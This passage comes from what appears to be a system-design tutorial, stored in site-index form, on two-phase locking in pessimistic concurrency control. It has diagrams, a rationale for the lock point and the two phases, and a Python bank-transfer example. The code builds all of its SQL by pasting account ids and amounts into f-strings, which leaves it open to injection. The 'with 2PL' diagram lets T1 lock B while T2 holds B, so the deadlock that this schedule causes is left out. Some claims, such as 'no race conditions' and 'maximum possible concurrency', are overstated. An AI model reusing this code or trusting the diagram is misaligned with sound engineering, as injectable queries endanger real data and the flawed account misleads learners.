\u2502\n\u2502    \u2502 \u2022 When to acquire locks (growing)    \u2502            \u2502\n\u2502    \u2502 \u2022 When to release locks (shrinking)  \u2502            \u2502\n\u2502    \u2502 \u2022 No arbitrary lock/unlock           \u2502            \u2502\n\u2502    \u2502                                      \u2502            \u2502\n\u2502    \u2502 Benefits:                            \u2502            \u2502\n\u2502    \u2502 \u2022 Easier to reason about             \u2502            \u2502\n\u2502    \u2502 \u2022 Predictable behavior               \u2502            \u2502\n\u2502    \u2502 \u2022 Simpler implementation             \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 6. \u2705 COMPATIBILITY WITH EXISTING SYSTEMS               \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Standard in SQL databases          \u2502            \u2502\n\u2502    \u2502 \u2022 Well-understood by developers      \u2502            \u2502\n\u2502    \u2502 \u2022 Extensive tooling support          \u2502            \u2502\n\u2502    \u2502 \u2022 Battle-tested over decades         \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Comparison: Pessimistic WITHOUT 2PL vs WITH 2PL:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502    PESSIMISTIC LOCKING: WITHOUT vs WITH 2PL             \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Scenario: Two transactions transferring money          \u2502\n\u2502                                                         \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u2502\n\u2502 \u2502 WITHOUT 2PL DISCIPLINE (ad-hoc locking)         \u2502    \u2502\n\u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524    \u2502\n\u2502 \u2502 T1:                      T2:                    \u2502    \u2502\n\u2502 \u2502 Lock(A)                  Lock(B)                \u2502    \u2502\n\u2502 \u2502 Read A                   Read B                 \u2502    \u2502\n\u2502 \u2502 Unlock(A) \u26a0\ufe0f             Unlock(B) \u26a0\ufe0f           \u2502    \u2502\n\u2502 \u2502 Lock(B)                  Lock(A)                \u2502    \u2502\n\u2502 \u2502 Update B                 Update A               \u2502    \u2502\n\u2502 \u2502 Unlock(B)                Unlock(A)              \u2502    \u2502\n\u2502 \u2502 Commit                   Commit                 \u2502    \u2502\n\u2502 \u2502                                                 \u2502    \u2502\n\u2502 \u2502 Problem: NOT SERIALIZABLE!                      \u2502    \u2502\n\u2502 \u2502 \u2022 A unlocked before B locked                    \u2502    \u2502\n\u2502 \u2502 \u2022 Other transactions can interfere              \u2502    \u2502\n\u2502 \u2502 \u2022 Intermediate inconsistent state visible       \u2502    \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518    \u2502\n\u2502                                                         \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u2502\n\u2502 \u2502 WITH 2PL DISCIPLINE (strict protocol)           \u2502    \u2502\n\u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524    \u2502\n\u2502 \u2502 T1:                      T2:                    \u2502    \u2502\n\u2502 \u2502 \u2500\u2500\u2500\u2500 GROWING PHASE \u2500\u2500\u2500\u2500                         \u2502    \u2502\n\u2502 \u2502 Lock(A)                  Lock(B)                \u2502    \u2502\n\u2502 \u2502 Read A                   Read B                 \u2502    \u2502\n\u2502 \u2502 Lock(B)                  Lock(A) [waits for T1] \u2502    \u2502\n\u2502 \u2502 Update B                                        \u2502    \u2502\n\u2502 \u2502 \u2500\u2500\u2500\u2500 SHRINKING PHASE \u2500\u2500                         \u2502    \u2502\n\u2502 \u2502 Commit                   [still waiting]        \u2502    \u2502\n\u2502 \u2502 Unlock(A)                                       \u2502    \u2502\n\u2502 \u2502 Unlock(B)                                       \u2502    \u2502\n\u2502 \u2502                         \u2500\u2500\u2500\u2500 GROWING PHASE \u2500\u2500\u2500\u2500 \u2502    \u2502\n\u2502 \u2502                         [T1 released, T2 gets A]\u2502    \u2502\n\u2502 \u2502                         Read A                  \u2502    \u2502\n\u2502 \u2502                         Update A                \u2502    \u2502\n\u2502 \u2502                         \u2500\u2500\u2500\u2500 SHRINKING PHASE \u2500\u2500 \u2502    \u2502\n\u2502 \u2502                         Commit                  \u2502    \u2502\n\u2502 \u2502                         Unlock(A), Unlock(B)    \u2502    \u2502\n\u2502 \u2502                                                 \u2502    \u2502\n\u2502 \u2502 \u2713 SERIALIZABLE! Equivalent to T1 then T2        \u2502    \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518    \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Code Example - 2PL in Action:</p> <pre><code># Pessimistic Concurrency Control WITH Two-Phase Locking\n\nclass TwoPhaseLockingTransaction:\n    \"\"\"\n    Implements 2PL protocol for pessimistic concurrency control\n    \"\"\"\n\n    def __init__(self, db_connection):\n        self.db = db_connection\n        self.locks_held = set()\n        self.phase = \"NOT_STARTED\"  # NOT_STARTED, GROWING, SHRINKING\n\n    def begin(self):\n        \"\"\"Start transaction - enter growing phase\"\"\"\n        self.db.execute(\"BEGIN TRANSACTION\")\n        self.phase = \"GROWING\"\n        print(\"Transaction started - GROWING PHASE\")\n\n    def acquire_lock(self, resource_id, lock_type=\"EXCLUSIVE\"):\n        \"\"\"\n        Acquire lock (only allowed in GROWING phase)\n        \"\"\"\n        if self.phase == \"SHRINKING\":\n            raise Exception(\n                \"2PL VIOLATION! Cannot acquire lock in SHRINKING phase\"\n            )\n\n        if self.phase != \"GROWING\":\n            raise Exception(\"Transaction not started\")\n\n        # Acquire lock\n        if lock_type == \"SHARED\":\n            query = f\"SELECT * FROM {resource_id} FOR SHARE\"\n        else:  # EXCLUSIVE\n            query = f\"SELECT * FROM {resource_id} FOR UPDATE\"\n\n        self.db.execute(query)\n        self.locks_held.add(resource_id)\n        print(f\"\u2713 Acquired {lock_type} lock on {resource_id}\")\n        print(f\"  Locks held: {self.locks_held}\")\n\n    def release_lock(self, resource_id):\n        \"\"\"\n        Release lock - transitions to SHRINKING phase\n        \"\"\"\n        if self.phase == \"GROWING\":\n            # First lock release \u2192 transition to SHRINKING\n            self.phase = \"SHRINKING\"\n            print(\"\u2500\u2500\u2500 Entered SHRINKING PHASE \u2500\u2500\u2500\")\n\n        self.locks_held.remove(resource_id)\n        print(f\"\u2713 Released lock on {resource_id}\")\n        print(f\"  Locks held: {self.locks_held}\")\n\n    def commit(self):\n        \"\"\"\n        Commit transaction - releases ALL locks\n        Automatically enters SHRINKING phase\n        \"\"\"\n        if self.phase == \"GROWING\":\n            self.phase = \"SHRINKING\"\n            print(\"\u2500\u2500\u2500 Entered SHRINKING PHASE (via commit) \u2500\u2500\u2500\")\n\n        self.db.execute(\"COMMIT\")\n\n        # Release all locks\n        for resource in list(self.locks_held):\n            print(f\"\u2713 Released lock on {resource}\")\n\n        self.locks_held.clear()\n        self.phase = \"NOT_STARTED\"\n        print(\"Transaction committed - all locks released\")\n\n\n# Example usage: Bank transfer with 2PL\n\ndef transfer_with_2pl(from_account, to_account, amount):\n    \"\"\"\n    Transfer money using Two-Phase Locking protocol\n    \"\"\"\n    txn = TwoPhaseLockingTransaction(get_db_connection())\n\n    try:\n        # BEGIN TRANSACTION\n        txn.begin()\n\n        # \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n        #         GROWING PHASE STARTS\n        # \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\n        # Acquire locks in order (prevent deadlock)\n        accounts = sorted([from_account, to_account])\n\n        print(f\"\\n1. Acquiring lock on {accounts[0]}\")\n        txn.acquire_lock(f\"accounts WHERE id='{accounts[0]}'\", \"EXCLUSIVE\")\n\n        print(f\"\\n2. Acquiring lock on {accounts[1]}\")\n        txn.acquire_lock(f\"accounts WHERE id='{accounts[1]}'\", \"EXCLUSIVE\")\n\n        # All locks acquired - at LOCK POINT\n        print(\"\\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500 LOCK POINT \u2500\u2500\u2500\u2500\u2500\u2500\u2500\")\n        print(\"All needed locks acquired!\")\n\n        # Read balances\n        balance_from = txn.db.execute(\n            f\"SELECT balance FROM accounts WHERE id='{from_account}'\"\n        ).fetchone()[0]\n\n        balance_to = txn.db.execute(\n            f\"SELECT balance FROM accounts WHERE id='{to_account}'\"\n        ).fetchone()[0]\n\n        # Validate\n        if balance_from &lt; amount:\n            raise Exception(\"Insufficient funds\")\n\n        # Perform transfer\n        txn.db.execute(f\"\"\"\n            UPDATE accounts SET balance = balance - {amount}\n            WHERE id = '{from_account}'\n        \"\"\")\n\n        txn.db.execute(f\"\"\"\n            UPDATE accounts SET balance = balance + {amount}\n            WHERE id = '{to_account}'\n        \"\"\")\n\n        print(f\"\\n3. Transfer complete: {from_account} \u2192 {to_account}: ${amount}\")\n\n        # \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n        #        SHRINKING PHASE STARTS\n        # \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\n        # Commit (releases all locks at once)\n        print(\"\\n4. Committing transaction...\")\n        txn.commit()\n\n        print(\"\\n\u2705 Transfer successful!\")\n        return True\n\n    except Exception as e:\n        # Rollback releases all locks\n        print(f\"\\n\u274c Error: {e}\")\n        txn.db.execute(\"ROLLBACK\")\n        txn.locks_held.clear()\n        txn.phase = \"NOT_STARTED\"\n        print(\"Transaction rolled back - all locks released\")\n        return False\n\n\n# Usage\ntransfer_with_2pl(\"A\", \"B\", 100)\n</code></pre> <p>Output: <pre><code>Transaction started - GROWING PHASE\n\n1. Acquiring lock on A\n\u2713 Acquired EXCLUSIVE lock on accounts WHERE id='A'\n  Locks held: {'accounts WHERE id='A''}\n\n2. Acquiring lock on B\n\u2713 Acquired EXCLUSIVE lock on accounts WHERE id='B'\n  Locks held: {'accounts WHERE id='A'', 'accounts WHERE id='B''}\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500 LOCK POINT \u2500\u2500\u2500\u2500\u2500\u2500\u2500\nAll needed locks acquired!\n\n3. Transfer complete: A \u2192 B: $100\n\n4. Committing transaction...\n\u2500\u2500\u2500 Entered SHRINKING PHASE (via commit) \u2500\u2500\u2500\n\u2713 Released lock on accounts WHERE id='A'\n\u2713 Released lock on accounts WHERE id='B'\nTransaction committed - all locks released\n\n\u2705 Transfer successful!\n</code></pre></p> <p>Why 2PL Makes Pessimistic Control Effective:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502    2PL: THE FOUNDATION OF PESSIMISTIC CONTROL           \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Without 2PL:                                            \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 \u274c Locks can be acquired/released anytime \u2502           \u2502\n\u2502 \u2502 \u274c No guarantee of serializability         \u2502           \u2502\n\u2502 \u2502 \u274c Race conditions possible                \u2502           \u2502\n\u2502 \u2502 \u274c Inconsistent intermediate states        \u2502           \u2502\n\u2502 \u2502 \u274c Hard to reason about correctness        \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 With 2PL:                                               \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 \u2705 Structured lock acquisition/release    \u2502           \u2502\n\u2502 \u2502 \u2705 Guaranteed serializability              \u2502           \u2502\n\u2502 \u2502 \u2705 No race conditions                      \u2502           \u2502\n\u2502 \u2502 \u2705 Isolated transaction execution          \u2502           \u2502\n\u2502 \u2502 \u2705 Clear correctness guarantee             \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 Conclusion:                                             \u2502\n\u2502 2PL is the PROTOCOL that makes pessimistic              \u2502\n\u2502 concurrency control CORRECT and RELIABLE!               \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#454-different-phases-of-two-phase-locking-detailed","title":"4.5.4 Different Phases of Two-Phase Locking (Detailed)","text":"<p>Description:</p> <p>While we've introduced the two phases earlier, let's dive deeper into the characteristics, rules, and behavior of each phase to fully understand how 2PL guarantees serializability.</p> <p>The two phases are not arbitrary divisions - they represent a fundamental property of conflict-serializable schedules. The mathematical proof (by Eswaran et al., 1976) shows that if all transactions follow this two-phase discipline, the resulting schedule is guaranteed to be conflict-serializable, meaning it's equivalent to some serial execution order.</p> <p>The Lock Point Concept:</p> <p>The transition between growing and shrinking phases occurs at a critical moment called the lock point - the instant when a transaction holds the maximum number of locks it will ever hold. This lock point is crucial because:</p> <ol> <li> <p>Serialization Order: The relative order of transactions' lock points determines the equivalent serial schedule. If T1's lock point occurs before T2's lock point, then in the equivalent serial schedule, T1 executes completely before T2.</p> </li> <li> <p>Conflict Resolution: All conflicts between transactions are resolved by the time both reach their lock points. After that, they can safely release resources without interfering.</p> </li> <li> <p>Isolation Guarantee: At the lock point, the transaction has \"captured\" a consistent snapshot of all resources it needs, ensuring isolation from other transactions.</p> </li> </ol> <p>Why the Phase Separation is Mathematically Necessary:</p> <p>The two-phase constraint might seem arbitrary, but it's actually the minimal restriction needed to guarantee serializability:</p> <ul> <li>Too lenient (allow lock acquisition after any release): Non-serializable schedules possible (inconsistent analysis)</li> <li>Too strict (hold all locks until commit): Correct but reduces concurrency unnecessarily (rigorous 2PL)</li> <li>Just right (two phases): Guaranteed serializability with maximum possible concurrency</li> </ul> <p>This is an example of what computer scientists call an elegant solution - the simplest possible rule that solves the problem completely.</p> <p>Phase Transition as a One-Way Door:</p> <p>The irreversibility of the phase transition (growing \u2192 shrinking, never reverse) is critical. Think of it like a ratchet mechanism: - Growing Phase: Ratchet moves forward (accumulating locks) - Lock Point: Ratchet reaches maximum position - Shrinking Phase: Ratchet can only move backward (releasing locks) - No return: Once you release one lock, the ratchet mechanism prevents acquiring new locks</p> <p>This one-way property ensures that once a transaction \"commits\" to a particular view of the database (at lock point), it cannot change its mind and grab additional resources, which would break serializability.</p> <p>Real-World Analogy:</p> <p>Think of the two phases like preparing for a presentation:</p> <p>Growing Phase = Gathering materials: - Collect all slides, data, charts - Cannot present yet (not all resources ready) - Keep accumulating until you have everything</p> <p>Lock Point = Materials complete: - All resources gathered - Ready to present - Committed to this version</p> <p>Shrinking Phase = Giving presentation: - Use the materials you gathered - Return materials as you finish with them - Cannot go back and grab new materials (presentation already started) - Must work with what you collected in growing phase</p> <p>Phase 1: Growing Phase (Lock Acquisition Phase)</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         PHASE 1: GROWING PHASE (EXPANSION)              \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Duration: From BEGIN to LOCK POINT                      \u2502\n\u2502                                                         \u2502\n\u2502 RULES:                                                  \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 \u2705 CAN acquire new locks                 \u2502           \u2502\n\u2502 \u2502 \u2705 CAN upgrade locks (shared \u2192 exclusive)\u2502           \u2502\n\u2502 \u2502 \u274c CANNOT release any lock               \u2502           \u2502\n\u2502 \u2502 \u274c CANNOT downgrade locks                \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 CHARACTERISTICS:                                        \u2502\n\u2502 \u2022 Transaction accumulates resources                     \u2502\n\u2502 \u2022 Lock count increases monotonically                    \u2502\n\u2502 \u2022 No lock is ever released                              \u2502\n\u2502 \u2022 Phase ends at \"lock point\"                            \u2502\n\u2502                                                         \u2502\n\u2502 LOCK POINT:                                             \u2502\n\u2502 \u2022 The moment when transaction holds                     \u2502\n\u2502   maximum number of locks                               \u2502\n\u2502 \u2022 All required locks have been acquired                 \u2502\n\u2502 \u2022 Transaction ready to release locks                    \u2502\n\u2502                                                         \u2502\n\u2502 ALLOWED OPERATIONS:                                     \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 1. LOCK(X) - Acquire new lock on X       \u2502           \u2502\n\u2502 \u2502 2. UPGRADE(X) - Shared \u2192 Exclusive lock  \u2502           \u2502\n\u2502 \u2502 3. READ(X) - Read locked resource        \u2502           \u2502\n\u2502 \u2502 4. WRITE(X) - Write locked resource      \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 Timeline Example:                                       \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 t1: BEGIN                                \u2502           \u2502\n\u2502 \u2502 t2: LOCK(A) \u2713          [1 lock]          \u2502           \u2502\n\u2502 \u2502 t3: READ(A)            [1 lock]          \u2502           \u2502\n\u2502 \u2502 t4: LOCK(B) \u2713          [2 locks]         \u2502           \u2502\n\u2502 \u2502 t5: READ(B)            [2 locks]         \u2502           \u2502\n\u2502 \u2502 t6: LOCK(C) \u2713          [3 locks]         \u2502           \u2502\n\u2502 \u2502 t7: WRITE(C)           [3 locks]         \u2502           \u2502\n\u2502 \u2502 \u2500\u2500\u2500 LOCK POINT \u2500\u2500\u2500                       \u2502           \u2502\n\u2502 \u2502 (All needed locks acquired)              \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Phase 2: Shrinking Phase (Lock Release Phase)</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502        PHASE 2: SHRINKING PHASE (CONTRACTION)           